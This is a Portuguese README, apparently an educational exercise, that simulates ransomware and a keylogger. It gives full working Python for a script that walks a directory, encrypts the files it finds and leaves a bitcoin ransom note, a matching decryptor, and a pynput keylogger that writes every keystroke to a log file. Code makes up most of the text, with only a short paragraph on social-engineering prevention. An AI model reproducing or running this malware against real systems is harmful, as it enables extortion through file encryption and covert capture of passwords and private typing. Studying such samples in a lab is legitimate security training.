# Simulando-Ataque-Ransonware-e-Keylogger

### Simulando  Ambiente em que ransonware captura os dados previamente criados:

Com a ferramenta Visual Code, foi criada uma pasta denominada "test_files", na qual foram criados dois arquivos.txt chamados "dados_confidenciais.txt" e "senhas.txt".

Como o nome já diz, dentro deles foram armazenadas senhas e conteúdos que, em tese, não devem ser acessados.

Em ambiente controlado, será criado um programa que acessa esses arquivos.txt, criptografa eles e exige uma chave para acessá-los.


### Elaborando um script de Ransomware que buscará e encriptará os arquivos.txt criados:

```python

from cryptography.fernet import Fernet
import os

1. Gerar uma chave de criptografia e salvar

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

2. Carregar a chave salva

def carregar_chave():
    return open("chave.key", "rb").read()

 3. Criptografar um único arquivo

def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

 4. Encontrar arquivos para criptografar

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransonnware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

 5. Mensagem de resgate

def criar_mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envie 1 bitcoin para o endereço X e envie o comprovante!\n")
        f.write("Depois disso, enviaremos a chave para você recuperar seus dados")


 
6. Execução principal

def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransonware executado! Arquivos criptografados!")

if __name__ == '__main__':
    main()

```
Assim, será criado um programa que acessa os diretórios e pastas do sistema, criptografa os arquivos previamente criados e somente possibilita o acesso a eles mediante uma chave que foi gerada.

### Descriptografando os arquivos.txt criptografados:

```python
from cryptography.fernet import Fernet
import os

def carregar_chave():
    return open("chave.key", "rb").read()

def descriptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
        dados_descriptografados = f.decrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_descriptografados)

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransonnware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

def main():
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        descriptografar_arquivo(arquivo, chave)
    print("Arquivos restaurados com sucesso")

if __name__ == '__main__':
    main()
```
Após executado o código criado, automaticamente é reestabelecido o acesso aos arquivos.txt, pois foram descriptografados com a chave gerada no momento da criptografia.

Importante observar e alertar sobre os métodos de Engenharia Social, que fazem com que as pessoas caiam em ataque Ransomware, assim como os links maliciosos, instalações de jogos crackeados, anexos falsos por email e scripts maliciosos dentro de arquivos aparentemente inofensivos. Assim, estará prevenindo que ocorram ataques como esse.

## Simulando a execução de um Keylogger

Será criado um programa via Python em que se registre as teclas utilizadas pelo usuário após a execução do programa, ignorando as teclas preestabelecidas (CTRL, SHIFT, ALT, CAPSLOCK etc), para que não fique poluído o arquivo.txt onde será armazenado o registro. Vejamos:

```python
from pynput import keyboard

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

def on_press(key):
    try:
        # se for uma tecla "normal" (letra, número, símbolo)
       
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)     
    except AttributeError:
         with open("log.txt", "a", encoding="utf-8")as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                pass
            else:
                f.write(f"[{key}] ")
         

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```
Assim, após executado o arquivo keylogger.py, será criado automaticamente um arquivo "log.txt", onde será armazenada todas as teclas que o usuário pressionar, enquanto estiver rodando o programa.

